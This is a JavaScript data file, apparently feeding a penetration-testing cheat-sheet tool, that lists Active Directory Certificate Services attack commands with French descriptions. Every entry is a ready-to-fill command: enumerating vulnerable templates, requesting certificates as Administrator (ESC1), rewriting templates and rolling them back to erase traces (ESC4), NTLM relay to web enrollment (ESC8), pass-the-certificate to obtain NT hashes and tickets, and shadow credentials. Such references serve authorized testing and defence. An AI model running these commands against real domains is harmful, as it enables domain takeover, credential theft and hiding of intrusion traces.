export const ADCS_DATA = [
  {
    name: 'Enumeration (Find Vulns)',
    nodes: [
      { 
        label: 'Certipy Find', 
        cmd: 'certipy find -u <user>@<domain> -p <password> -dc-ip <dc_ip> -vulnerable -stdout', 
        leadsTo: 'Vulnerable Templates',
        description: 'Scanne l\'Active Directory pour trouver des modèles de certificats (Templates) mal configurés et vulnérables (ESC1, ESC2, ESC3, ESC4, ESC8, etc.).'
      },
      { 
        label: 'Certify (Windows)', 
        cmd: 'Certify.exe find /vulnerable', 
        leadsTo: 'Vulnerable Templates',
        description: 'Outil C# natif pour l\'énumération des vulnérabilités ADCS. Plus discret et souvent utilisé via Cobalt Strike ou un accès local.'
      }
    ]
  },
  {
    name: 'ESC1 (Misconfigured Template)',
    nodes: [
      { 
        label: 'Certipy Req (ESC1)', 
        cmd: 'certipy req -u <user> -p <password> -ca <ca_name> -target <ca_ip> -template <vuln_template> -upn administrator@<domain>', 
        leadsTo: 'Administrator.pfx',
        description: 'Exploite un modèle permettant le "Client Authentication" et "Enrollee Supplies Subject" pour demander un certificat au nom de l\'Administrateur.'
      },
      { 
        label: 'Certify Request', 
        cmd: 'Certify.exe request /ca:<ca_name> /template:<vuln_template> /altname:Administrator', 
        leadsTo: 'Certificate (PEM)',
        description: 'Version Windows de l\'attaque ESC1. Génère une clé privée et un certificat permettant l\'usurpation d\'identité.'
      }
    ]
  },
  {
    name: 'ESC4 (Vulnerable ACLs)',
    nodes: [
      { 
        label: 'Overwrite Template (ESC4)', 
        cmd: 'certipy template -u <user> -p <password> -template <target_template> -save-old -configuration <json_config>', 
        leadsTo: 'Vulnerable Template',
        description: 'Si vous avez les droits d\'écriture sur un modèle (GenericWrite/WriteDacl), cette commande le modifie pour le rendre vulnérable à ESC1.'
      },
      { 
        label: 'Rollback Template', 
        cmd: 'certipy template -u <user> -p <password> -template <target_template> -configuration <old_json_config>', 
        leadsTo: 'Clean Trace',
        description: 'Restaure la configuration originale du modèle après exploitation pour effacer les traces.'
      }
    ]
  },
  {
    name: 'ESC8 (Relay to HTTP)',
    nodes: [
      { 
        label: 'Find ESC8 (Web Enrollment)', 
        cmd: 'certipy find -u <user>@<domain> -p <password> -dc-ip <dc_ip> -vulnerable', 
        leadsTo: 'Web Enrollment URL',
        description: 'Identifie si le service "Certification Authority Web Enrollment" (HTTP) est activé et permet le relais NTLM.'
      },
      { 
        label: 'Relay Attack (See MITM)', 
        cmd: 'ntlmrelayx.py -t http://<ca_ip>/certsrv/certfnsh.asp --adcs --template DomainController', 
        leadsTo: 'DC Certificate',
        description: 'Référence croisée : Utilisez ntlmrelayx (Module MITM) pour relayer une authentification machine (PetitPotam) vers l\'ADCS.'
      }
    ]
  },
  {
    name: 'Pass The Certificate (Auth)',
    nodes: [
      { 
        label: 'Certipy Auth (PFX to TGT)', 
        cmd: 'certipy auth -pfx administrator.pfx -dc-ip <dc_ip>', 
        leadsTo: 'NT Hash & TGT',
        description: 'Utilise le certificat volé/forgé (.pfx) pour s\'authentifier via Kerberos (PKINIT) et récupérer le hash NT ainsi qu\'un ticket TGT.'
      },
      { 
        label: 'Rubeus AskTGT', 
        cmd: 'Rubeus.exe asktgt /user:Administrator /certificate:admin.pfx /password:<pfx_pass> /domain:<domain> /dc:<dc_ip> /ptt', 
        leadsTo: 'Admin Session',
        description: 'Demande un TGT via PKINIT et l\'injecte directement dans la session courante (Pass-The-Ticket).'
      }
    ]
  },
  {
    name: 'Shadow Credentials (ESC10/Others)',
    nodes: [
      { 
        label: 'Certipy Shadow', 
        cmd: 'certipy shadow auto -u <user>@<domain> -p <password> -account <target_machine$>', 
        leadsTo: 'Machine Takeover',
        description: 'Injecte un certificat directement sur l\'objet cible via l\'attribut msDS-KeyCredentialLink (nécessite des droits d\'écriture).'
      }
    ]
  }
];